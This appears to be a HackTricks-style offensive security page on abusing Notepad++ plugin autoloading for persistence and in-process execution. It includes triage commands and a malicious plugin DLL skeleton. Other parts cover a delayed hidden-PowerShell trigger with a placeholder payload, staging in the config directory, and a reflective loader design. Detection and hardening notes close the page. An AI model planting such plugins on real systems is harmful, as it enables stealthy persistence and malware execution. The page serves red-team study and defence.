# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ will **autoload every plugin DLL found under its `plugins` subfolders** on launch. Dropping a malicious plugin into any **writable Notepad++ installation** gives code execution inside `notepad++.exe` every time the editor starts, which can be abused for **persistence**, stealthy **initial execution**, or as an **in-process loader** if the editor is launched elevated.

Since **Notepad++ 7.6+** the expected manual-install layout is **one subfolder per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presence of `doLocalConf.xml` next to `notepad++.exe`), the whole application tree stays local to that directory, which often turns copied/admin tool bundles into an easy user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (usually requires admin to write).
- Writable options for low-privileged operators:
  - Use the **portable Notepad++ build** in a user-writable folder.
  - Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
  - Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Plugin load points (execution primitives)
Notepad++ expects specific **exported functions**. These are all called during initialization, giving multiple execution surfaces:
- **`DllMain`** — runs immediately on DLL load (first execution point).
- **`setInfo(NppData)`** — called once on load to provide Notepad++ handles; typical place to register menu items.
- **`getName()`** — returns the plugin name shown in the menu.
- **`getFuncsArray(int *nbF)`** — returns menu commands; even if empty, it is called during startup.
- **`beNotified(SCNotification*)`** — receives Notepad++ / Scintilla events (useful to defer payloads until a user action or editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, useful for larger data exchanges.
- **`isUnicode()`** — compatibility flag checked at load.

Most exports can be implemented as **stubs**; execution can occur from `DllMain` or any callback above during autoload.

## Minimal malicious plugin skeleton
Compile a DLL with the expected exports and place it in `plugins\\MyNewPlugin\\MyNewPlugin.dll` under a writable Notepad++ folder:

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
For OPSEC, many payloads should **not** fire from `DllMain`. A quieter pattern is to let the plugin load cleanly, then execute only after a realistic editor event such as **startup complete**, **buffer activation**, or the **first typed character**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

This matches public offensive research better than a noisy `DllMain` beacon: the DLL is still autoloaded at startup, but the malicious action is delayed until Notepad++ looks genuinely in use.

## Using the plugin config directory as secondary storage
Notepad++ exposes `NPPM_GETPLUGINSCONFIGDIR`, which returns the **current user's plugin configuration directory**. A malicious plugin can use this to keep the on-disk DLL minimal while storing encrypted config, staged payloads, or tasking files in a path that blends in with normal plugin state.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operationally this is useful when you want:
- a tiny autoloaded bootstrap DLL;
- per-user tasking without touching the main plugin binary again;
- to separate the **autoload trigger** from the heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
